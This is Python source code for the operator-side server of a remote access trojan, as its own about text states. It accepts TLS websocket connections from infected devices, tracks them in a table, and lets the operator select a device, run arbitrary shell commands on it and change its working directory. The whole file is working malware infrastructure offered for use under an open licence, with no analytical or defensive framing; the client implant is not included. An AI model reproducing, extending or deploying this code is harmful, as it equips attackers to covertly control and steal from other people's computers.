__author__ = "Zhaobokai"
__license__ = "GPL v3"

import asyncio
import websockets
import ssl
import rich
import json
from time import sleep
from sys import exit

from rich.console import Console
from rich.table import Table
from rich.json import JSON
import rich.traceback 

# Install rich traceback to show local variables
rich.traceback.install(show_locals=True)

# --- Basic Configuration ---
# HOST: IP address for the server to listen on
# PORT: Port number for the server to listen on
# SSL_CERT: SSL certificate file path
# SSL_KEY: SSL private key file path
HOST = '0.0.0.0' 
PORT = 8765
SSL_CERT = 'cert.pem' 
SSL_KEY = 'key.pem' 

# --- Global Variables ---
# control_list: Stores information of all connected clients
# select_client: Currently selected client ID
control_list = {}
select_client = None

# --- Custom Logging Function ---
class Printer:
    """Custom logging class supporting different levels of log output"""
    def __init__(self):
        self.console = Console()
    
    def log_info(self, message: str):
        """Output info level log"""
        self.console.log(f"[white on blue][*][/white on blue]", message, style="white")

    def log_warning(self, message: str):
        """Output warning level log"""
        self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")

    def log_error(self, message: str):
        """Output error level log"""
        self.console.log(f"[white on red][-][/white on red]", message, style="bold red")

    def log_success(self, message: str):
        """Output success level log"""
        self.console.log(f"[white on green][+][/white on green]", message, style="green")
    
    def log_debug(self, message: str):
        """Output debug level log"""
        self.console.log(f"[grey50][|][/grey50]", message, style="grey50")

class Exit_Exception(Exception):
    """Custom exit exception class"""
    pass

def output(*args, type=""):
    printer = Printer()
    if type.strip() == "":
        printer.console.log(*args)
    else:
        if type == "info":
            printer.log_info(*args)
        elif type == "warning":
            printer.log_warning(*args)
        elif type == "error":
            printer.log_error(*args)
        elif type == "success":
            printer.log_success(*args)
        elif type == "debug":
            printer.log_debug(*args)
        else:
            raise ValueError(f"Invalid type: {type}")


# --- Server Logic ---
class Server:
    """Core server functionality class, handling server-level command operations"""
    def __init__(self):
        pass
    
    def help(self):
        """Display help information"""
        help_text = '''Help:
[u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
[u bold yellow]about[/u bold yellow]: [green]Show about information[/green]
[u bold yellow]exit[/u bold yellow]: [green]Exit the program[/green]
[u bold yellow]clear[/u bold yellow]: [green]Clear the terminal screen[/green]
[u bold yellow]list[/u bold yellow]: [green]Show list of connected devices[/green]
[u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
[u bold yellow]delete <id>[/u bold yellow]: [green]Delete a connected device[/green]'''  
        output(help_text, type="info")

    def about(self):
        """Display about information"""
        about_text = '''About:
Author: Zhaobokai
Copyright: Copyright © Zhaobokai, All Rights Reserved.
This is open source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
Licensed under GPL v3, please comply with the license.'''
        output(about_text, type="info")
    
    def client_list(self):
        """Display list of connected clients"""
        if len(control_list) == 0:
            output("No devices currently connected.", type="info")
        else:
            output(f"Currently {len(control_list)} devices connected", type="info")
            output("Connected devices list:", type="info")
            table = Table(
                title="Device Information",
                title_style="bold blue",
                show_header=True,
                border_style="bold purple",
                show_lines=True,
                expand=True
            )
            table.add_column("[bold red]Device ID[/bold red]")
            table.add_column("[bold #FFA500]IP Address[/bold #FFA500]")
            table.add_column("[bold yellow]Connection Status[/bold yellow]")
            for device in control_list.items():
                table.add_row(f"{device[0]}", 
                              f"{device[1]['ip']}", 
                              f"{device[1]['status']}")
            output(table, type="info")
            del table

    def select(self, id):
        global select_client
        if id in control_list:
            select_client = id
            output(f"Selected device with ID {id}.", type="success")
        else:
            output(f"Device with ID {id} does not exist.", type="error")
    
    async def delete(self, id):
        global control_list
        if id in control_list:
            websocket = control_list[id]['websocket']
            try:
                await websocket.send("exit")
            except Exception as e:
                output(f"Exception occurred while disconnecting device {id}: {e}", type="warning")
            control_list.pop(id)
            output(f"Successfully deleted device with ID {id}.", type="success")
        else:
            output(f"Device with ID {id} does not exist.", type="error")

# --- Target Device Control Logic ---
class ControlClient:
    """Client control class, handling operations on selected client"""
    def __init__(self, id):
        self.id = id
        self.websocket = control_list[id]['websocket']

    def help(self):
        """Display client control help information"""
        help_text = '''Help:
[u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
[u bold yellow]back[/u bold yellow]: [green]Return to previous level[/green]
[u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
[u bold yellow]command[/u bold yellow]: [green]Enter command mode to execute commands and get results[/green]
[u bold yellow]cd <dir>[/u bold yellow]: [green]Change working directory[/green]'''
        output(help_text, type="info")
    
    async def execute_command(self, command):
        await self.websocket.send(f"command:{command}")
        result = await self.websocket.recv()
        return result
    async def change_directory(self, directory):
        await self.websocket.send(f"cd:{directory}")
        result = await self.websocket.recv()
        return result


# --- Client Connection Handling Logic ---
async def handle_client(websocket):
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    device_info = {
        "id": str(websocket.id),
        "ip": ip,
        "status": "connected",
        "websocket": websocket
    }
    control_list[device_info['id']] = {
        "ip": device_info['ip'],
        "status": device_info['status'],
        "websocket": device_info['websocket']
    }
    await websocket.wait_closed()
    
# --- Check Client Connection Status ---
async def check_clients_connection():
    global control_list
    while True:
        if len(control_list) > 0:
            for device in control_list.items():
                if select_client == device[0]:
                    control_list[device[0]]['status'] = "used"
                try:
                    await device[1]['websocket'].ping()
                    control_list[device[0]]['status'] = "connected"
                except:
                    control_list[device[0]]['status'] = "disconnected"
        await asyncio.sleep(10)

# --- User Interaction Logic ---
async def input_loop():
    global select_client, control_list

    server = Server()
    while True:
        if select_client is None:
            # Server level command processing
            command = await asyncio.to_thread(input, "(server)> ")
            command = command.strip()
            match command:
                case "": continue
                case "help": server.help()
                case "about": server.about()
                case "exit": raise Exit_Exception
                case "clear": print("\033[H\033[J")
                case "list": server.client_list()
                case command if command.startswith("select"): 
                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
                case command if command.startswith("delete"): 
                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
                case _: output(f"Unknown command: {command}, type help to see available commands.", type="error")
        else:
            # Client level command processing
            control_client = ControlClient(select_client)
            command = await asyncio.to_thread(input, f"(console)({select_client})> ")
            command = command.strip()
            match command:
                case "": continue
                case "help": control_client.help()
                case "back": select_client = None
                case "clear": print("\033[H\033[J")
                case "command":
                    # Command execution mode
                    while True:
                        try:
                            command = await asyncio.to_thread(input, "(command)({select_client})> ")
                            if command == "exit":
                                break
                            else:
                                result = await control_client.execute_command(command)
                                result = json.loads(result)
                                for key, value in result.items():
                                    output(f"[bold cyan]{key}:[/bold cyan] {value}")
                        except Exception as e:
                            output(f"Exception occurred while executing command: {e}", type="error")
                case command if command.startswith("cd"):
                    result = await control_client.change_directory(command.split(maxsplit=1)[1]);output(result, type="info") if len(command.split(maxsplit=1)) > 1 else output("Please enter directory to change to.", type="error")
                case _: output(f"Unknown command: {command}, type help to see available commands.", type="error")

# --- Main Function ---
async def server_loop():
    output(f"Configuring certificate files, certificate location: {SSL_CERT}, key location: {SSL_KEY}", type="info")
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)

    output(f"Starting server, listening address: {HOST}, port: {PORT}", type="info")
    async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
        await asyncio.Future()

async def main():
    output("Starting program...", type="info")
    await asyncio.gather(
        server_loop(),
        input_loop(),
        check_clients_connection()
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        output("Copyright: Copyright © Zhaobokai, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        output("Program interrupted by user.", type="warning")
        exit()
    except Exit_Exception:
        output("Program exited normally.", type="success")
        exit()
